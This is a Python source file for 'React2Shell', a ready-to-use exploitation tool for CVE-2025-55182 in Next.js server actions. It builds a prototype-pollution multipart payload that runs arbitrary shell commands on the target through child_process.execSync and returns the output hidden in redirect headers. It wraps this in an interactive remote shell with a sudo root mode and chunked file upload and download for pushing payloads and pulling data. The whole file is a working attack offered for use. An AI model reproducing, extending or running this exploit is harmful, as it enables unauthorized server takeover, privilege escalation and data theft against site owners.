#!/usr/bin/env python3
"""
React2Shell - CVE-2025-55182 Exploitation Suite (v2 - Upgraded)
Standalone Version - No external dependencies

Fixes & improvements over the original:
  * Command is BASE64-encoded before being sent to the target, then
    piped through /bin/sh. This removes ALL shell-escaping issues
    (single/double quotes, backslashes, $, backticks, newlines, pipes,
    redirects) that broke the original implementation.
  * Command timeout raised from 5s to 120s (configurable at runtime
    with .timeout <ms>) so slow commands like "curl -o file.deb" can
    actually complete.
  * HTTP client timeout derived from command timeout so the shell
    never gives up before the target finishes.
  * .upload <local> <remote>  - chunked base64 upload (push .deb etc.
    into target even when target has no egress).
  * .download <remote> [local] - chunked download, works for files
    larger than the redirect header limit.
  * Robust current-directory quoting so dirs with spaces work.
  * Better error reporting - distinguishes HTTP timeout from
    target-side exec timeout from decode failure.

Usage:
  python3 react2shell.py -u https://target.example/
  python3 react2shell.py -u https://target.example/ -t 60000
"""
import sys
import os
import base64
import re
import time
from datetime import datetime
from urllib.parse import unquote

try:
    import readline
except ImportError:
    import pyreadline3 as readline

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Defaults
DEFAULT_CMD_TIMEOUT_MS = 120000    # 120s for command execution on target
UPLOAD_CHUNK_B64 = 8000            # base64 chars per upload chunk
DOWNLOAD_CHUNK_BYTES = 4000        # original bytes per download chunk


def _sq_escape(s: str) -> str:
    """Safely embed s inside single quotes for /bin/sh."""
    return s.replace("'", "'\\''")


def _is_error_output(out: str) -> bool:
    """True if execute_command() returned an error marker."""
    if not out:
        return False
    return ("[-]" in out) or ("Status: 4" in out) or ("Status: 5" in out)


class EnhancedShell:
    def __init__(self, target_url, cmd_timeout_ms=DEFAULT_CMD_TIMEOUT_MS):
        self.target = target_url
        self.history_file = ".shell_history"
        self.root_mode = False
        self.current_dir = None
        self.cmd_timeout_ms = int(cmd_timeout_ms)
        self.http_timeout_s = (self.cmd_timeout_ms // 1000) + 20
        self.session = requests.Session()
        self.session.verify = False
        self.setup_readline()

    # ---------- readline ----------

    def setup_readline(self):
        try:
            readline.read_history_file(self.history_file)
        except FileNotFoundError:
            pass
        try:
            readline.set_history_length(1000)
        except Exception:
            pass

    def save_history(self):
        try:
            readline.write_history_file(self.history_file)
        except Exception:
            pass

    # ---------- payload builder ----------

    def build_payload(self, cmd: str):
        """Build the CVE-2025-55182 multipart payload.

        The command is base64-encoded and piped to /bin/sh on the target,
        avoiding every shell-escaping pitfall.
        """
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

        wrapped = f"({cmd}) 2>&1 || true"
        cmd_b64 = base64.b64encode(wrapped.encode("utf-8")).decode("ascii")

        # On target: echo <b64> | base64 -d | sh
        js_cmd = f"echo {cmd_b64} | base64 -d | sh"

        prefix_payload = (
            "var res=process.mainModule.require('child_process')"
            f".execSync('{js_cmd}',{{'timeout':{self.cmd_timeout_ms}}})"
            ".toString('base64');"
            "throw Object.assign(new Error('NEXT_REDIRECT'), "
            "{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});"
        )

        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )

        parts = [
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n",
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n',
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n",
            "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
        ]
        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type

    # ---------- command execution ----------

    def execute_command(self, command):
        """Execute command on target. Returns decoded stdout+stderr or error."""
        # Prepend current directory (quoted safely)
        if self.current_dir:
            safe_dir = _sq_escape(self.current_dir)
            cmd_with_dir = f"cd '{safe_dir}' && {command}"
        else:
            cmd_with_dir = command

        # Wrap with sudo when in root mode
        if self.root_mode:
            inner_b64 = base64.b64encode(cmd_with_dir.encode()).decode("ascii")
            final_cmd = f"echo {inner_b64} | base64 -d | sudo -i 2>&1 || true"
        else:
            final_cmd = cmd_with_dir

        body, content_type = self.build_payload(final_cmd)
        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "Content-Type": content_type,
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }

        try:
            response = self.session.post(
                self.target,
                headers=headers,
                data=body,
                timeout=self.http_timeout_s,
                allow_redirects=False,
            )
        except requests.exceptions.Timeout:
            return f"{RED}[-] HTTP request timed out after {self.http_timeout_s}s{RESET}"
        except Exception as e:
            return f"{RED}[-] Request error: {e}{RESET}"

        # Extract base64 output from redirect headers
        redirect_header = response.headers.get("X-Action-Redirect", "")
        m = re.search(r".*/login\?a=(.*?)(?:;|$)", redirect_header)
        if not m:
            location_header = response.headers.get("Location", "")
            m = re.search(r"login\?a=(.*?)(?:;|$)", location_header)

        if m:
            try:
                return base64.b64decode(unquote(m.group(1))).decode(
                    "utf-8", errors="ignore"
                ).strip()
            except Exception as e:
                return f"{RED}[-] Failed to decode output: {e}{RESET}"

        return f"{YELLOW}[!] No output in response (Status: {response.status_code}){RESET}"

    # ---------- file transfer ----------

    def upload_file(self, local_path, remote_path):
        """Push a local file to the target via chunked base64."""
        if not os.path.isfile(local_path):
            print(f"{RED}[-]{RESET} Local file not found: {local_path}")
            return False

        with open(local_path, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode("ascii")
        chunks = [b64[i:i + UPLOAD_CHUNK_B64]
                  for i in range(0, len(b64), UPLOAD_CHUNK_B64)]

        print(f"{YELLOW}[*]{RESET} Uploading {local_path} "
              f"({len(data)} bytes) to {remote_path} "
              f"in {len(chunks)} chunks ...")

        staging = remote_path + ".b64"
        self.execute_command(f"rm -f {staging}")
        self.execute_command(f"touch {staging}")

        for i, chunk in enumerate(chunks, 1):
            cmd = f"printf '%s' '{chunk}' >> {staging}"
            out = self.execute_command(cmd)
            if _is_error_output(out):
                print(f"{RED}[-]{RESET} Chunk {i}/{len(chunks)} failed: {out}")
                return False
            if i % 10 == 0 or i == len(chunks):
                print(f"{YELLOW}[*]{RESET} {i}/{len(chunks)} chunks sent")

        out = self.execute_command(
            f"base64 -d {staging} > {remote_path} && rm -f {staging} "
            f"&& wc -c < {remote_path}"
        )
        print(f"{YELLOW}[*]{RESET} Remote size: {out}")
        return True

    def download_file(self, remote_path, local_path=None):
        """Fetch a remote file in chunks."""
        if not local_path:
            local_path = f"downloaded/{os.path.basename(remote_path)}"
        outdir = os.path.dirname(os.path.abspath(local_path)) or "."
        os.makedirs(outdir, exist_ok=True)

        print(f"{YELLOW}[*]{RESET} Downloading {remote_path} ...")
        size_str = self.execute_command(f"wc -c < {remote_path} 2>/dev/null")
        try:
            size = int(size_str.strip().split()[0])
        except (ValueError, IndexError, AttributeError):
            print(f"{RED}[-]{RESET} Cannot stat remote file. Output: {size_str!r}")
            return False
        print(f"{YELLOW}[*]{RESET} Remote size: {size} bytes")

        buf = bytearray()
        for off in range(0, size, DOWNLOAD_CHUNK_BYTES):
            # 1-indexed tail, then head -c for the chunk
            cmd = (
                f"tail -c +{off + 1} {remote_path} "
                f"| head -c {DOWNLOAD_CHUNK_BYTES} | base64 -w0"
            )
            b64_out = self.execute_command(cmd)
            if _is_error_output(b64_out) or not b64_out or "No output" in b64_out:
                print(f"{RED}[-]{RESET} Chunk at {off} failed: {b64_out}")
                return False
            try:
                buf.extend(base64.b64decode(b64_out.strip()))
            except Exception as e:
                print(f"{RED}[-]{RESET} Decode failed at {off}: {e}")
                return False
            print(f"{YELLOW}[*]{RESET} {min(off + DOWNLOAD_CHUNK_BYTES, size)}/{size} bytes")

        with open(local_path, "wb") as f:
            f.write(buf)
        print(f"{GREEN}[+]{RESET} Downloaded to: {os.path.abspath(local_path)} "
              f"({len(buf)} bytes)")
        return True

    # ---------- interactive shell ----------

    def print_banner(self):
        print(f"{BOLD}{CYAN}╔{'═' * 60}╗{RESET}")
        print(f"{BOLD}{CYAN}║{RESET}{' ' * 12}"
              f"{BOLD}{GREEN}React2Shell - Next.js RCE Shell (v2){RESET}"
              f"{' ' * 11}{BOLD}{CYAN}║{RESET}")
        tgt = (self.target[:45] + "...") if len(self.target) > 48 else self.target
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Target:{RESET} {tgt:<48}  {BOLD}{CYAN}║{RESET}")
        status = "ON" if self.root_mode else "OFF"
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Root Mode:{RESET} {status:<45}  {BOLD}{CYAN}║{RESET}")
        print(f"{BOLD}{CYAN}║{RESET}  {MAGENTA}Timeout:{RESET} {self.cmd_timeout_ms}ms"
              f"{' ' * max(0, 38 - len(str(self.cmd_timeout_ms)))}"
              f"{BOLD}{CYAN}║{RESET}")
        print(f"{BOLD}{CYAN}╚{'═' * 60}╝{RESET}")
        print(f"\n{BOLD}Commands:{RESET}")
        print(f"  {GREEN}.root{RESET}     - Toggle root mode (sudo -i)")
        print(f"  {GREEN}.save{RESET}     - Save last output to file")
        print(f"  {GREEN}.download{RESET} - .dl <remote> [local]  (chunked)")
        print(f"  {GREEN}.upload{RESET}   - .up <local> <remote>  (chunked)")
        print(f"  {GREEN}.timeout{RESET}  - Show/set cmd timeout (ms)")
        print(f"  {GREEN}.exit{RESET}     - Exit shell")
        print(f"  {GREEN}.help{RESET}     - Show this help\n")

    def toggle_root_mode(self):
        self.root_mode = not self.root_mode
        s = f"{GREEN}ENABLED{RESET}" if self.root_mode else f"{RED}DISABLED{RESET}"
        print(f"{YELLOW}[*]{RESET} Root mode {s}")

    def save_output(self, output, filename=None):
        if not filename:
            filename = f"output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, "w") as f:
                f.write(output)
            print(f"{GREEN}[+]{RESET} Output saved: {os.path.abspath(filename)}")
        except Exception as e:
            print(f"{RED}[-]{RESET} Save failed: {e}")

    def update_working_directory(self):
        cwd = self.execute_command("pwd")
        if cwd and cwd.startswith("/"):
            self.current_dir = cwd.split("\n")[0].strip()

    def handle_cd(self, path):
        out = self.execute_command(f"cd {path} && pwd")
        if out and out.startswith("/"):
            self.current_dir = out.split("\n")[0].strip()
        else:
            print(out or f"{RED}[-]{RESET} Directory not found")

    def run(self):
        self.print_banner()
        print(f"{YELLOW}[*]{RESET} Initializing "
              f"(cmd timeout={self.cmd_timeout_ms}ms, "
              f"http timeout={self.http_timeout_s}s) ...")
        self.update_working_directory()
        last_output = ""

        try:
            while True:
                try:
                    user = f"{BOLD}{RED}root{RESET}" if self.root_mode else f"{BOLD}{GREEN}ubuntu{RESET}"
                    d = f"{BOLD}{BLUE}{self.current_dir or '~'}{RESET}"
                    prompt = f"{user}@{BOLD}{CYAN}target{RESET}:{d}$ "
                    cmd = input(prompt).strip()
                    if not cmd:
                        continue

                    if cmd == ".exit":
                        break
                    elif cmd == ".root":
                        self.toggle_root_mode()
                        self.current_dir = None
                        self.update_working_directory()
                        continue
                    elif cmd == ".help":
                        self.print_banner()
                        continue
                    elif cmd == ".save":
                        if last_output:
                            self.save_output(last_output)
                        else:
                            print(f"{RED}[-]{RESET} No output to save")
                        continue
                    elif cmd.startswith(".timeout"):
                        parts = cmd.split()
                        if len(parts) == 1:
                            print(f"{YELLOW}[*]{RESET} cmd={self.cmd_timeout_ms}ms "
                                  f"http={self.http_timeout_s}s")
                        else:
                            try:
                                self.cmd_timeout_ms = int(parts[1])
                                self.http_timeout_s = (self.cmd_timeout_ms // 1000) + 20
                                print(f"{GREEN}[+]{RESET} cmd={self.cmd_timeout_ms}ms "
                                      f"http={self.http_timeout_s}s")
                            except ValueError:
                                print(f"{RED}[-]{RESET} Usage: .timeout <ms>")
                        continue
                    elif cmd.split()[0] in (".download", ".dl"):
                        parts = cmd.split()
                        if len(parts) < 2:
                            print(f"{YELLOW}[!] Usage: .download <remote> [local]{RESET}")
                            continue
                        self.download_file(parts[1], parts[2] if len(parts) > 2 else None)
                        continue
                    elif cmd.split()[0] in (".upload", ".up"):
                        parts = cmd.split()
                        if len(parts) < 3:
                            print(f"{YELLOW}[!] Usage: .upload <local> <remote>{RESET}")
                            continue
                        self.upload_file(parts[1], parts[2])
                        continue
                    elif cmd.startswith("cd "):
                        self.handle_cd(cmd.split(" ", 1)[1])
                        continue

                    last_output = self.execute_command(cmd)
                    if last_output:
                        print(last_output)

                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!]{RESET} Use .exit to quit")
                    continue
                except Exception as e:
                    print(f"{RED}[-]{RESET} Error: {e}")
        finally:
            self.save_history()
            print(f"\n{GREEN}[+]{RESET} Shell session ended")


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(
        description="React2Shell - Standalone Next.js RCE Shell (v2)"
    )
    ap.add_argument("-u", "--url", required=True,
                    help="Target URL (e.g., https://example.com/)")
    ap.add_argument("-t", "--timeout", type=int,
                    default=DEFAULT_CMD_TIMEOUT_MS,
                    help=f"Command timeout in ms (default {DEFAULT_CMD_TIMEOUT_MS})")
    args = ap.parse_args()

    EnhancedShell(args.url, cmd_timeout_ms=args.timeout).run()
